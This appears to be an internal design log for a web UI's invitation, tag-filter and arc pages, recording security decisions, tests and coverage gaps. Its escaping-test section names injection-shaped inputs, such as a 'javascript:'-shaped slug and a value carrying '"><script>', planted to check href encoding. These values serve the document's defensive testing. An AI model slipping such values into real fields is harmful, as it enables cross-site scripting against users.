| `GET /join?invite=<token>` | `public` | what an invited person opens |

## 🔴 `GET /join` is PUBLIC, and what makes that safe is that it resolves nothing

An invited person is by definition somebody this control plane may never have heard of, so a
row behind the authentication chain is a door that opens only for people already inside. A
public row is therefore forced. What is *not* forced is that it be safe, and the property that
makes it so is that **`handleJoinPage` never looks the token up**: every token renders the same
page. A handler that resolved one would answer differently for a token that exists and one that
does not, on an unauthenticated route, at whatever rate a caller cares to drive it — an oracle
over other people's invitations. That is `flights.start`'s ruling one layer up, where the same
argument keeps `POST /sign-in/github` from validating an invite token at the start of a flight.

⚠ **The cost is a UX one and the decision is REVISITABLE.** A dead, expired or already-used
link shows "sign in to accept" and then a generic refusal at the far end, and the page cannot
name the project or the role. An operator who would rather show those has to accept that the
page becomes an oracle, or design a second mechanism that reveals them without resolving a
token on a public route. This is the open decision this phase hands over.

🔴 **The one distinction the page DOES draw is "the URL carried no token at all", and it is not
an oracle** — that is a fact about the caller's own address bar (a truncated paste, a retyped
link), and no token was presented for the answer to be about. Rendering the accept form anyway
would post an empty invitation, open a flight carrying none, and complete as an **ordinary
sign-in** — which for somebody who was invited is the most confusing available outcome: signed
in as nobody, or refused, with nothing anywhere saying the link was at fault.

## 🔴 The mint response does not redirect, and that is the one place this flow breaks the house pattern

Every other write here is a POST-redirect-GET, because a write that renders its own answer is a
write a refresh repeats. This one cannot be: `invite.NewToken` returns the token exactly once
and only its digest is stored, so there is nothing to render on the far side of a hop. Both ways
to keep the redirect were weighed and refused:

- **the token in the redirect URL** — refused outright. It is a bearer capability that can
  create a principal, and a query parameter lands in browser history, in the referrer the next
  hop receives and in every access log en route. That is `inviteTokenField`'s own argument about
  the same value, and the reason it is a form field everywhere else.
- **stash it server-side, keyed by session, and redirect** — refused as a worse trade: a new
  table of live capabilities with its own expiry, its own single-use question and its own
  restart behaviour, bought to avoid a refresh that mints a spare invitation.

⚠ **So the accepted cost, named rather than discovered:** reloading that response re-submits the
form and mints a SECOND invitation. Browsers prompt first, the extra is listed on the project's
page and is revocable, and an invitation grants nothing until it is redeemed. The response
carries `Cache-Control: no-store` because its body *is* the capability. It was once the ONLY page
sent that, through its own `writeHTMLNoStore`; since S3 of the mobile plan (Phase Q) `no-store` is
the one value `writeHTML` sends on every HTML page, and the mint gets it the same way.

🔴 **And the link is rendered as TEXT, not as an `<a href>`.** `MintedInvite.Link` is a PATH
with no origin (this process cannot know its own external address — `OAuthCallbackPath`'s
reason), so an anchor would resolve it against *this* page and hand the minter a one-click way
to redeem the invitation they just created, spending it on themselves. It is also the shape a
link-prefetcher and a mail scanner follow. `TestTheMintedTokenIsRenderedOnceUnderNoStoreAndNeverLogged`
pins all of it, and the anchor mutant is in the sweep.

## 🔴 `GET /invite` answers 200 on a deployment with no invite store; the WRITES answer 501

These look interchangeable and are not. The two OAuth rows answer 501 when no provider is
configured, and that is right *because a button guards them* — `SignInPage` withholds it, so the
501 is only ever seen by somebody driving the route directly. `GET /invite` is reached by a link
in the header of **every page**, unconditionally, so a 501 there is a dead link in the frame of
the whole surface: the exact "a working feature reads as absent" defect the header link exists to
close, arriving through the other door. The read therefore renders the page and says
`NoInviteStore` in the body — `ReadOnlyAuthority`'s ruling — and the writes, which nothing links,
refuse with the cause.

⚠ **The no-store page must NOT carry the authority sentence.** "No project is yours to invite
into. That is an authority answer, not an empty control plane." is a claim about MEMBERSHIP, and
in that configuration nothing was asked. Rendering it would be the measured lie `handlePage`
already shipped once. Pinned by `TestTheInviteRowsAnswerHonestlyWithNoInviteStore`.

## 🔴 The role chooser and the mint read ONE predicate, and the seam between them was a measured hole

`control.Role.CanConfer` is the escalation rule — an admin may not make an owner, because they
could then confer it on themselves and the journal would read as an ordinary join. It is a
method rather than a condition at the mint because it had two readers the moment the page
existed: the mint refuses with it, and the chooser filters with it. A chooser built from
`control.AllRoles` unfiltered would offer an admin a value the mint then refuses, which is a form
whose visible options include one that cannot work.

🔴 **The caller's role crosses that seam on `control.NamedProject.HeldRole`, and deleting that
field SURVIVED a fully green suite.** `internal/control` tested `ProjectsManagedBy` against a
hand-built Model; the renderer tested the chooser against a hand-built `NamedProject`. Both
hermetic, both green, and neither ever built the combined state — so the one wire carrying "what
may this caller confer" from the model to the form could be removed and the only symptom was a
chooser that silently offered nothing. Closed by two guards, because either alone is satisfiable
by the wrong half: `TestProjectsManagedByCarriesTheCallersOwnRole` (the component, with a
per-PROJECT literal expectation — a per-USER one went red on correct code, because the fixture
gives one user different roles in different projects) and
`TestTheRoleChooserIsDrivenByTheREALModelsHeldRole` (the seam, driving the real authority through
the real renderer). The sweep carries three rows for it, including one that reports a non-empty
but WRONG role, which a zero-check cannot see.

🔴 **And the chooser's default is chosen, not inherited.** `control.AllRoles` is in DESCENDING
authority, and a `select` with no explicit selection submits its FIRST option — so an unread form
would confer **ownership**. `leastPrivilegedRole` is selected explicitly, it is spelled as its own
name rather than as `AllRoles[len-1]` (an index would be a claim about that slice's order, and
reordering a rendered list would silently move the default), and the order itself is pinned by
`TestAllRolesIsTheWholeRoleTable` because that comment depends on it.

## 🔴 Revoke is its own path, and it authorises from the stored row

`POST /invite/revoke` rather than an `action=` field on `POST /invite`: a hidden field would make
the difference between MINTING a capability and withdrawing one a value inside a form body,
chosen by whoever gets one request past both cross-site gates, rather than something the route
decides. `UnsharePath`'s ruling, same hazard. The authority comes from the invitation's own
stored row (`ControlInviting.Revoke` resolves the project from the digest), so a caller who
manages project A cannot revoke an invitation into B by naming A. The form *does* carry a
project — ancillary in `ScopeOfGrant`'s sense, read only to decide where the redirect lands, and
never an authority input; the worst a wrong value does is land the caller on the uniform 404.

⚠ **The revoke button's absence on a spent row is UX, not the guard.** `invite.Store.Revoke`
refuses a non-open invitation itself and `refuseInviteWrite` answers that uniformly. What
withholding the button saves is a person clicking a control that cannot work.

## 🔴 The invitation token is read with `PostFormValue`, and for one release it was not

`inviteTokenField` is declared a form field and never a query parameter, for the reason the
mint-redirect bullet above gives: the value is a bearer capability that can CREATE a principal,
and a query parameter lands in browser history, in the referrer the next hop receives and in
every access log en route. That declaration binds nothing on its own. **What binds is the READ
at each consumer**, and `handleOAuthStart` shipped reading `r.FormValue` — which returns
`r.Form`, the posted body **union the URL query** — under a comment promising the value "never
appears in a URL, a referrer or an access log". So `POST /sign-in/github?invite=<token>` was
accepted and the flight carried the token out of a URL, which is precisely the leak the field is
declared body-only to prevent.

Measured with `httptest` on a request carrying the field in the query alone: `FormValue`
returned it, `PostFormValue` returned `""`.

Two consumers, two different correct spellings, and neither may be `FormValue`:

| consumer | read | why |
|---|---|---|
| `handleOAuthStart` (POST) | `r.PostFormValue` | the token must come out of the body the accept form posted, never out of a URL |
| `handleJoinPage` (GET) | `r.URL.Query().Get` | the invitation LINK is the one place the token legitimately appears in a URL, and `FormValue` on a GET would ALSO read a **multipart** body no browser navigation sends |

⚠ **THAT LAST CLAUSE IS TRUE FOR MULTIPART AND FALSE FOR THE COMMONER SPELLING, WHICH IS WHY IT
NOW NAMES THE TYPE.** Measured on the pinned toolchain: `GET` + `application/x-www-form-urlencoded`
carrying the field ⇒ `FormValue` returns `""`, because `ParseForm` reads the body only for
POST/PUT/PATCH; `GET` + `multipart/form-data` ⇒ `FormValue` returns the body's value, because
`FormValue` reaches `ParseMultipartForm` and that does not branch on the method. An earlier draft
said "a body", unqualified — and a reader who writes a urlencoded-GET-body guard against it
watches it pass vacuously and concludes the hazard is closed. The source comment this table was
derived from carried the qualifier; the table dropped it.

⚠ `handleJoinPage` was corrected for the same distinction in its own commit, which is what makes
the wrong spelling on the start row a thing a reader walks past twice — and is why the rule now
lives on `inviteTokenField` itself, naming the read, rather than only as a property of the field.
`TestTheGitHubStartRowIgnoresAnInvitationTokenInTheQUERYString` measures it, in a pair: the query
case must not be picked up, and the SAME token in the BODY must be — because a bare "it was not
redeemed" is a reassuring zero and a zero is indistinguishable from a harness wired to nothing.
`control_mutants.py`'s `ui-start-row-reads-the-invite-from-the-url-query` is the standing proof
that guard can go red, rather than one afternoon's reading recorded in a commit message.

## Refusals: which one discriminates, and why exactly one does

| condition | status | body |
|---|---|---|
| no such project, or not yours | 404 (read) / 403 (write) | `inviteRefusal` / `inviteWriteRefusal`, uniform |
| unknown digest, or not open | 403 | `inviteWriteRefusal` — the SAME bytes, so a revoke cannot ask whether a digest exists |
| a role your role may not confer | 403 | `roleRefusal`, which SAYS so |
| no invite store on this deployment | 200 (read) / 501 (write) | `NoInviteStore` |

`roleRefusal` is the one that discriminates, and it is admissible for `ReadOnlyAuthority`'s
reason: every fact the uniform rule protects is a fact about somebody ELSE, while this one is
about the caller's own standing in a project they have already proved they manage. It names
neither the role held nor the role asked for — those go to the log, because a page echoing the
submitted role would be reflecting caller-chosen text into a sentence the page presents as its
own, which is what `outcomeFrom` refuses.

## What this phase's guards still cannot see

- 🔴 **`handleJoinPage`'S READ. THE TWO-CONSUMER RULE ABOVE IS MEASURED ON ONE CONSUMER.**
  `TestTheGitHubStartRowIgnoresAnInvitationTokenInTheQUERYString` covers `handleOAuthStart` and
  nothing else. Measured: respelling `invitehandlers.go`'s read as `r.FormValue` leaves
  `go test ./...` at **rc 0** with the whole tree green — while the SAME suite reddens for that
  mutation in `handleOAuthStart`, which is the paired control proving the suite can see the change
  and simply never looks at this page. A `GET /join` carrying a multipart body would then supply
  the token, a second input path into the one value this page reflects, with every gate green.
  ⚠ This is the same defect class the start-row fix closed, one file over, and it is listed here
  rather than fixed because the deterministic remedy — an AST ban over the package, whose
  allowlist is measured EMPTY — is wider than that fix and is filed separately.

- **A real redemption over HTTP.** ❌ **THE SENTENCE HERE WAS FALSE AND IS RETRACTED RATHER THAN
  EDITED AWAY, BECAUSE IT IS THE REASON NOBODY LOOKED.** It read: *"`handleOAuthCallback`'s
  provisioning arm needs a provider exchange that fails with `identity.UnprovisionedSubject`, and
  `oauth_test.go` drives that with a stub."* Measured: `oauth_test.go` contained **zero**
  references to an invite or to `UnprovisionedSubject`. The callback's redemption behaviour — the
  handler that can CREATE A PRINCIPAL — was driven by **nothing**, and the identical claim sat in
  `invitefixture_test.go`'s own stub. 🔴 **That gap is what hid a total defect**: a user the
  control plane already held could never redeem anything, because the provisioning arm is guarded
  on the exchange having FAILED, and theirs succeeds. `oauth_invite_test.go` drives both arms now
  (provisioned stranger, known user, the refuse/admit asymmetry, and a no-invitation negative
  control), and `Inviting.RedeemFor` is the path the known user takes.
  ⚠ **What is still unmeasured is the REAL provider.** Nothing here has driven a real GoTrue, so
  `GET /join` → accept → provider → callback → a co-member in the share picker remains a human's:
  that is rank 9 and rank 13.
- **Postgres.** `Inviting` is stubbed in every test in this phase; the real `invite.Store` is
  `internal/pgstore`, measured by the build-tagged tier. ✅ **THE WIRING IS NO LONGER ABSENT —
  28(c) LANDED IT, AND THE SENTENCE THAT STOOD HERE IS CORRECTED RATHER THAN DELETED because a
  reader who took it at face value would conclude the flow is inert.** It read: *"the WIRING —
  `cmd/cairn-ui` constructing a `ControlInviting` over a real DSN and refusing at startup rather
  than at first request — is 28(c) and does not exist yet, so on this tree every deployment takes
  the `NoInviteStore` branch."* `cmd/cairn-ui` now takes `-db-dsn` / `$CAIRN_UI_DB_DSN`, opens
  `internal/pgstore` (which pings AND migrates) before it binds a listener, and refuses with exit
  78 if it cannot — so a deployment that CONFIGURES a database holds invitations, and one that
  does not still takes the `NoInviteStore` branch, deliberately.
  ⚠ **What is still stubbed is every test IN THIS PHASE**, which is the half that has not moved:
  the DSN branch is measured in `cmd/cairn-ui/database_pgtest_test.go`, behind the same build tag
  as the SQL, and `tests/pgtest/run.sh` is the only thing that runs it. So `go test ./...` — the
  nix sandbox included — still says nothing about a real invite store.
- **The `-session-file` path on a database deployment.** Setting a DSN MOVES the session table
  there as well, which is one operator-visible consequence with no test on the deployed surface:
  the first start with a DSN signs every open browser out once. The binary announces it; nobody
  has watched it happen on a cluster.
- **The browser.** `uiaudit` now walks both new GET rows (`GET /invite` via `linkExpanded`,
  `GET /join` via `plainGET`), and its per-project page is unreachable on a token-file world for
  the same reason the share flow's scope page is — no project is manageable there. Nothing has
  been captured in a real browser, and `refuseWalkRegressions` does not refuse on axe
  violations: **#134's round 1 measured a `landmark-unique` regression reaching `main` green**,
  and this phase adds a third header affordance and two page frames to that same surface.
- **Concurrency.** Two clicks on one invitation are handled by the store's conditional UPDATE and
  measured in `internal/pgstore`; two simultaneous MINTS, or a revoke racing a redemption, are
  not driven anywhere.


# The `?tag=` surface — a filter on the root row, not a phase

`tags:` is an entry-level front-matter key and `/?tag=<name>` is the listing every rendered tag
links to. It is written up here rather than as a phase because it adds no route, no authority
question and no state change: it is one query parameter on an existing GET row plus a projection
field.

## 🔴 A QUERY PARAMETER IS A REQUIREMENT HERE, NOT THE HOUSE PREFERENCE `?q=` FOLLOWS

`?q=` and `?view=` ride on existing rows because a second path would be a second ledger row for
one answer — a preference, defensible either way. `?tag=` has no such choice. A tag is USER TEXT
out of a store file, so `/tag/<name>` would put caller-controlled bytes in a PATH SEGMENT, and
`routes` is an **exact-match map** whose completeness is the claim three separate things read:
`DeclaredRoutes()`, `TestEveryServedPathComesFromTheLedger`, and the `stateChanging`
classification the cross-site gates derive from. One prefix route makes "every served path is a
literal key in this map" false, and that sentence is load-bearing for the session layer rather
than documentation.

`TestTheTagParameterAddsNoRoute` is the guard, and it proves the parameter is **served** — a 200
carrying a real listing — before asserting the ledger has no tag row. A ledger with no row is
trivially true of a build that reads nothing.

## 🔴 `?tag=` IS SCALAR, AND THAT IS WHAT MADE THIS PAGE'S ONE-VALUE READ CORRECT

`handlePage` reads the parameter with `r.URL.Query().Get(QueryTag)`, which returns the FIRST
value and ignores the rest. While `?tag=` was repeatable with AND semantics that was a real
divergence and nothing here could see it: `?tag=a&tag=b` meant "entries carrying both" on the
pod and "entries carrying `a`, with `b` silently dropped" on this page, at 200, with a heading
naming one tag — and there was no repeated-parameter test on this side at all. The operand is
now ONE tag on an operator decision, so one value IS the whole operand and the pod reads the
LAST one by the rule every other scalar parameter there follows.

⚠ **Nothing on this page was fixed, and saying so is the point.** The line is what it was; the
surface narrowed underneath it. What that leaves declared rather than closed is the REFUSAL
policy, which still differs on purpose: an operand that folds away is a 400 on the pod and an
honest zero here, because this surface has no place to put a 400 for a browse parameter.

## 🔴 THE MEMBERSHIP TEST IS `store.HasTag`, NOT A LOCAL `slices.Contains`

`EntriesByTag` open-coded it while `store.HasTag`'s own header claimed to be the one spelling of
the predicate — two callers in `internal/report` and this third one that nothing compared against
them. Nothing about a browser listing makes "does this entry carry this tag" a different question
from `cairn recall --tag`, and the day the rule changes (a fold, a hierarchy, a prefix) is the day
a third spelling answers differently with no gate on it. The predicate takes the TAG SET rather
than a `store.Entry` for exactly this reason: `ui.Entry` is its own type, and a predicate over
`store.Entry` would have been unreachable from here.

## 🔴 THE AUTHORISATION ORDER IS STRUCTURAL HERE RATHER THAN REMEMBERED

`EntriesByTag` takes the already-narrowed scope **list** and is a package function rather than a
method on `StoreSource`, so it has no `s.Root` in scope. That is deliberate: a version taking
`control.Authorization` and loading the store itself would be correct today and one dropped
argument away from answering "every marketing entry" over the whole disk.
`TestTheTagPageCannotSeeAScopeTheCallerCannotRead` is the two-principal guard, with the positive
control that the wide list finds both entries — without it the narrow list's single match is a
fact about a filter wired to nothing.

## 🔴 `Entry.Tags` IS FOLDED WHERE `Aliases` IS AS-WRITTEN, AND THE ASYMMETRY *IS* THE LINK

The string on the page has to be the string the filter compares. Showing the raw spelling beside
a link built from the folded one would put two spellings of one tag in front of a reader with no
way to tell which the store holds. `Aliases` keeps its raw form because it has no link and its
written spelling is evidence about a collision.

⚠ **THE VISIBLE DEFINITION LINES ARE GONE, AND SO ARE THEIR PINS — AN OPERATOR DECISION, NOT A
RETRACTION.** `TagsKeyDescription` and `RefsKeyDescription` were sentences under the entry page's
Tags and Refs headings, each pinned whole (the tags one against a hand-typed literal, with the
battery row `ui-tags-key-description-loses-both-its-claims` as the gate on that fix — the lesson
of why a pin compared against its own constant was blind still holds for every pinned claim left,
and the history of this file records it). The operator judged the definitions noise on a page read
every day; the constants, both tests and the battery row were deleted together, because a pin on a
string the page no longer renders guards nothing. What survives is a SHORT tooltip on each heading
(`the tags: front-matter key, folded to lowercase`; `… as written` for refs and aliases), which
keeps the one claim a reader comparing page against file needs. The tooltips are deliberately NOT
pinned by spelling; `TestTheRemovedDefinitionCopyIsAbsentAndChipsArePresent` pins that each heading
HAS one and that the old lines are absent.

⚠ **THE PAGE STILL DOES NOT ENUMERATE THE TAG SET,** for the reason that always held: the declared
terms live in `internal/write`'s `tagVocabulary` and in `lib/entry_shape.py`, pinned against each
other, and a third spelling on a page nothing gates against them is drift waiting to happen.

## 🔴 A HOSTILE TAG IS IN THE ESCAPING DIFFERENTIAL EVEN THOUGH THE LOADER CANNOT PRODUCE ONE

`parseTagsField` folds every tag to `[a-z0-9.-]`, so no store FILE can put a hostile string on
`Entry.Tags`. It is planted in `hostileWorld()` anyway, because a page whose escaping depended on
that invariant would be one new writer of this projection away from broken — and `ui.Entry` has
three writers already.

Two sinks, two DIFFERENT mechanisms, and only one of them is the escaper: the link TEXT goes
through `g.Text`, the HREF through `url.Values.Encode` — which is what stops a tag closing its
attribute and opening an event handler. A guard on the text alone would be green for an href built
by concatenation. `tagHref` must not reach `safeHref`, for the reason `scopeHref`/`entryHref` must
not: that function ALLOWLISTS absolute http(s) and would refuse a same-origin path.

## What this surface's guards still cannot see

- **A real browser.** `uiaudit` does not walk `/?tag=`, and the tag listing adds a fourth card
  shape plus a `<ul>` inside a `<p>` on every entry row of a scope page. Nothing has been captured
  in a browser and no axe pass has run over it — the same gap the phases above declare, and
  `refuseWalkRegressions` does not refuse on axe violations.
- **The listing at scale.** `EntriesByTag` walks every visible entry on every root request that
  carries a tag, and `Visible` has already read them all. On this store that is tens of entries;
  nothing measures where it stops being free, and there is no pagination on the listing where the
  scope page's index has a cap.
- **A tag on a MALFORMED entry.** A file the loader refused carries no tags a filter can see, and
  the listing says nothing about that — the CLI's `tag-absent` body does qualify its zero when the
  scope has rejects, and this page has no equivalent sentence.
- **Two clients of the same listing.** The pod's `?tag=` and this page's `?tag=` are different code
  paths over the same key: the pod goes through `report.Recall`/`report.Search` and this one
  filters `Visible`'s result. Nothing compares them, and they are not meant to agree on OUTPUT —
  only on which entries carry a tag. They now share the PREDICATE (`store.HasTag`), the FOLD
  (`store.NormalizeRef`) and, since `lastTagValue`, the REPEATED-PARAMETER rule; what is still
  uncompared is everything either side does around it, including the refusal policy above.
- **A COMPOSED answer in a real browser.** `?q=` and `?tag=` now compose (subsection below), and
  the composed card is a FIFTH card shape nothing has captured — three `note` links where the
  search card has one, and a hidden form control. `uiaudit` still does not walk `/?tag=`, so it
  does not walk this either, and no axe pass has run over it.

### ✅ `?q=` AND `?tag=` COMPOSE ON THIS SURFACE, THE SAME WAY THEY COMPOSE ON THE POD

**`/?q=lease&tag=marketing` renders ONE card**: a search over the entries carrying `marketing`,
nothing else. The tag goes INTO `report.Search` as `SearchOptions.Tag`/`HasTag` — the same call the
pod makes — so the narrowing happens after scope authorisation and before scoring, and every count
on the card (`TotalHits`, `BestBelow`, the hit budget) is a count over the narrowed set.
`handlePage`'s `switch` sets exactly one of `Results`/`TagMatches`, so the two-card answer is no
longer reachable.

**Which operand decides which shape.** The QUERY decides the answer shape and the TAG decides what
it ran over. A search is ranked; a tag listing is a membership test with nothing to rank; there is
no one card that is both. So `?tag=` alone keeps the listing it has always had, and adding words to
the box turns it into a search WITHIN that tag. The reverse order — a tag listing filtered by the
query — would answer a two-operand URL with an unranked list, which is the shape the pod does not
produce.

**The summary names both operands, and that is what makes the composed zero readable.**
`searchSummary` appends "The tag `x` narrowed this search to N entries before the query ran,
leaving out M visible entries that do not carry it." The counts are `report.SearchReport`'s own
`EntriesSearched` and `TagSkipped`, which is the identical argument `RefToSkipped` already carries
one package over: without them a composed zero cannot distinguish "these words are not in these
entries" from "the tag left nothing to search".

**The search form round-trips the tag**, as a hidden `<input type="hidden" name="tag">` rendered
only when a tag is in force. That closes the half most likely to read as a bug: the tag was
discarded at the one moment it was visible on screen. A blank submission with a tag in force now
lands on `?q=&tag=<it>`, which is the tag listing — so emptying the box is how a reader steps back
out of a composed search without losing the filter.

**Three ways back**, because a composed state has three neighbours and this surface has no script:
drop the tag and keep the words, drop the words and keep the tag, drop both. The bare-root link's
label changes with a tag in force, because "Clear the search and show every scope" beside a
composed answer describes one of the two things the link does.

**What was measured.** `TestTheQueryAndTheTagComposeIntoOneCard` drives the real `StoreSource` over
a five-entry store through the real dispatcher and checks THREE answers, not one: `?q=` alone names
three entries, `?tag=` alone names two, and together they name the one in both — so neither "ignores
the tag" nor "ignores the query" can pass. Watched RED with `handlePage`'s `switch` replaced by the
two independent `if`s it used to be and the tag dropped on the way into `Search`: two cards, `ledger`
and `charter` on the page, no tag clause. The form guard was watched red with the hidden input
removed (three sub-tests) and the no-tag case watched red with it always rendered.

**What is still NOT covered.** The pod's composed answer and this one are still not compared against
each other — they share the ENGINE now, which is strictly more than they shared before, but nothing
sends the same two parameters to both and diffs the result; the entries they select must agree, and
nothing they render around that is compared. And `tagItem` still builds a bare `/?tag=` href, so a
tag link does not carry a query — unreachable today, because the composed card renders search hits
and those carry no tag list, but it is the direction a future edit would have to carry.


# Phase H — who wrote here, and which arcs touched it (S4 of the arcs/sessions phase)

The browser half of `claudedocs/plan-cairn-arcs-sessions.md`'s slice S4: one new row and one new
pair of cards, and **no new derivation** — every value rendered is one the pod already computes.

| route | class | what |
|---|---|---|
| `GET /scope?id=<control.ID>` | `content` | unchanged row; the page grows two cards, "Sessions that wrote here" and "Arcs that touched this scope" — ⚠ since Phase I, two TABS (`?tab=sessions`, `?tab=arcs`) |
| `GET /arc?home=<control.ID>&slug=<slug>` | `content` | one registered arc: status, closing kind, registration, the tooling's own coverage, declared scopes NARROWED, members with the readable scopes each wrote in |

## 🔴 The data and its visibility come from the pod's code, and this package decides neither

The cards render `report.Sessions` (over `internal/touch`) and `report.Arcs`; the arc page renders
`report.Arc` (over `internal/arcs`' journal). Each is handed `scopeSetOf(auth.NamedScopes(VerbRead))` —
the ONE narrowing `StoreSource.Visible` already uses, `Authorization.VisibleScopes(VerbRead)` spelled
over that walk, which is the pod's `rq.visible`. The arc rule (an arc exists for a caller iff its HOME
scope is readable, operator decision Q1) is applied INSIDE `report.Arcs`/`report.Arc`, so there is no
second visibility check here to drift from the pod's.
`TestTheSectionIsTheSameAnswerTheReportsGiveForTheSameVisibleSet` pins the relationship rather than
either side: it computes the reports independently from `VisibleScopes(VerbRead)` for two principals
and requires the page to carry their lines and no arc they do not list.

⚠ **This does NOT revisit Phase E's decision.** Entry STRUCTURE still comes from `internal/store`'s
parsers, never through `internal/report`. What comes from `internal/report` here is the arcs/sessions
DATA and the sentences stating its coverage, which the plan requires to be the same on every surface:
`RenderText`'s lines became exported methods (`AttributedLine`, `StatusesLine`, `StatusSentence`,
`MemberLine`, …) that `RenderText` itself calls, so the page prints the pod's bytes in a different
layout and never a second spelling of them. `internal/report`'s literal-body tests are what proved
that refactor byte-preserving.

## 🔴 Every way to miss an arc is ONE answer, and it is the pod's own sentence

An unknown home id, a home the caller cannot read, an unregistered slug under a readable home, the
home spelled as a NAME, and a REGISTERED arc homed in an unreadable scope all answer **404 with
`report.ArcUnregisteredBody`**, byte for byte — the sentence that names neither home nor slug. The home
is a `control.ID` for `/scope?id=`'s reason, matched against the narrowed `Visible` answer and never
resolved; the slug is matched against the registered set inside `report.Arc`.

⚠ **Two layers hold the hidden-home case, and each alone was measured to hold it.** The id is matched
only against the caller's narrowed scopes, and `report.Arc` re-checks the home against the same set, so
a mutant removing EITHER layer survives (below) and only removing both leaks. That is defence in depth,
stated rather than counted as two guards.

## 🔴 Off, broken and empty are three states, and none of them is an error page

| state | scope page's arcs card | arc page |
|---|---|---|
| no `-arc-journal` (today's deployment) | 200: `status: registrations-unconfigured` and the pod's own unconfigured sentence | 200, the same sentence — decided BEFORE the home is looked at, so it says the same thing to every caller about every arc |
| configured, file unreadable | 200; the card says the journal could not be read — "could not look", never "no arc registered" | **503** |
| configured, nothing for this scope | 200, `no-arc-registered` with its counted lines | 404, the uniform answer |

The sessions card does not depend on the journal at all; it reads the store.

## 🔴 The binary: the pod's flag, the pod's variable, the pod's refusal — on a READ-ONLY mount

`cmd/cairn-ui -arc-journal` / `$CAIRN_ARC_JOURNAL`, defaulted through `envOr` exactly as
`cmd/cairn-server` does, refused when it reduces to nothing, and refused when it resolves INSIDE the
store root by calling `arcs.ResolveJournalPath` — the pod's one implementation of "inside". The UI only
ever calls `arcs.Journal.Read`; nothing in this package reaches `Register`. The startup line says
`arcs read-only from <path>` or `arcs unconfigured`, read off the WIRED source.
`TestTheBinaryREFUSESAnArcJournalInsideTheStoreRoot` re-execs the binary: a dot-directory journal, the
store root itself and a whitespace flag each exit 78 with their own message, and two controls (a
journal outside the root, no journal) come up and say which.

⚠ **The blank policy inherits the pod's limit, deliberately.** `envOr` reads a whitespace-only
`$CAIRN_ARC_JOURNAL` as unset, so only a whitespace FLAG reaches the refusal; a whitespace variable
yields the off state on BOTH binaries. Unlike `-control-journal`, the off state switches no authority
and is rendered honestly on every page, so the raw-read argument does not transfer — and changing it
is one decision for both binaries, not a UI-only divergence.

🔴 **Deployment requirement, not in this repository:** the journal's volume mounted READ-ONLY in the
UI's pod at the path the pod writes, with `CAIRN_ARC_JOURNAL` set — the plan's "Decisions taken"
names it. Until then this surface renders the off state, which is correct.

## ⚠ Links are built by `arcHref`, not `safeHref`, which departs from the plan's wording

The plan says "every href goes through `safeHref`". It cannot: `safeHref` ALLOWLISTS absolute
http(s), so a same-origin `/arc?…` would be refused and every arc would render as unlinked text —
which is why `scopeHref`/`entryHref`/`tagHref` already must not reach it. The arc data carries NO URL:
every href is a ledger constant plus `url.Values.Encode`, and session ids are text, never links. ⚠ **Retracted by Phase I on an operator request:** a session id now links to `/session?session=…`, built the same way (`sessionHref`).
`TestEveryArcHrefIsASameOriginPathWithEncodedOperands` plants a `javascript:`-shaped slug carrying
`&home=…#`, a home carrying `"><script>`, and a scope id carrying `&slug=` into the REPORT VALUE (the
journal's own validator refuses them — `hostileWorld`'s ruling for tags) and requires every rendered
href to parse as `/arc` with exactly two query values that round-trip unchanged.

## 🔴 `unknown` is `unknown`

Every status renders through `report.StatusWord` in one badge class, so `unknown` is never styled or
worded as `open` (Q4). `TestAnUnknownStatusIsRenderedAsUnknownAndNeverAsOpen` reads the unknown arc's
row for `open` (none), the counted line for `unknown 1`, and the arc page's badge and gloss; its
positive control is the same detector finding `status open` on an open arc's row.

## The RED proof

The new tests do not compile at the base commit (the types are new), which proves nothing about a
guard, so the proof is a mutation battery: ONE edit per mutant, each scored by the named test's own
`--- FAIL` line, an all-PASS baseline first. The ten kills are committed as rows of
`tests/control_mutants.py` (`ui-arc-*`, `ui-scope-section-*`, `ui-unconfigured-*`, `ui-binary-*`), so CI
re-runs them; the survivors are recorded here, because a row for them would have to be EQUIVALENT.

| mutant | guard | verdict |
|---|---|---|
| an unresolvable home refused with the SCOPE refusal | `TestAnArcHomedInAnUnreadableScopeRendersExactlyLikeANeverRegisteredOne` | KILLED |
| `report.Arcs` handed `store.Unrestricted()` | `TestTheScopePageListsOnlyArcsWhoseHomeIsReadable` (+ the same-set relation) | KILLED |
| a two-state badge (closed, else open) | `TestAnUnknownStatusIsRenderedAsUnknownAndNeverAsOpen` | KILLED |
| an unconfigured journal read as an unreadable one | `TestAnUnconfiguredJournalSaysSoRatherThanFailing` | KILLED |
| the arc page answers 500 for the off state | the same | KILLED |
| `arcHref` by string concatenation | `TestEveryArcHrefIsASameOriginPathWithEncodedOperands` | KILLED |
| the arc link's href is its label | the same | KILLED |
| the section fetched BEFORE the scope refusal | `TestAScopeTheCallerCannotReadGetsTheExistingRefusalAndNoSection` | KILLED |
| `main` ignores `resolveArcJournal`'s error | `TestTheBinaryREFUSESAnArcJournalInsideTheStoreRoot` | KILLED |
| the journal never handed to the source | the same (its control arm, through the startup line) | KILLED |
| `Source.Arc` narrows with `store.Unrestricted()`, alone | the arc-page guard | **SURVIVED** — the id match holds |
| an unresolved home id read as a NAME, alone | the arc-page guard | **SURVIVED** — `report.Arc`'s home check holds |
| both of the two above | the arc-page guard (its by-name row) | KILLED |
| `report.Sessions` handed `store.Unrestricted()` | every S4 guard | **SURVIVED** — for a scope already proved readable the sessions answer does not depend on the rest of the set; an invariant, not a hole |

⚠ **`TestAScopeTheCallerCannotReadGetsTheExistingRefusalAndNoSection` is half an INVARIANT guard.** Its
refusal half pins Phase E's `browseRefusal`, which this change did not touch; only its "the section's
source was never asked" half is new, and that is the half the ordering mutant kills.

The route ledgers moved and each went red first: `TestTheRouteLedgerMatchesTheDispatchTable`,
`TestEveryServedPathComesFromTheLedger` (`bareGETAnswer`) and `TestEveryContentRouteConsultsTheAuthority`
(`contentAuthority`) each named the new row before it was declared — `GET /arc` answers from `source`,
because `Touched`/`Arc` are on the `Source` interface rather than a seam that walk does not count — and
`uiaudit`'s `TestTheREALLedgerIsFullyACCOUNTEDFor` refused `GET /arc` until it joined `linkExpanded`.

## `uiaudit` walks the arc page — over a journal no deployment has yet

`boot.go`'s `writeArcJournal` registers one arc per fixture scope (slug = the scope's name, no members,
no status, so `unknown`), outside the store tree, and passes `-arc-journal`. One per scope is MEASURED,
not generous: with a single arc, the walk's per-page bound kept four scope pages by sorted ID, the arc's
home was not among them, and the first walk captured no `/arc?…` page at all. Measured with chromium
154 over the walk's own hermetic pod: 120 captures, four `/arc?home=…&slug=…` pages each reached by
following a scope page's link, 0 overflow, 0 scripts, 0 axe violations, content floor 90.2%.

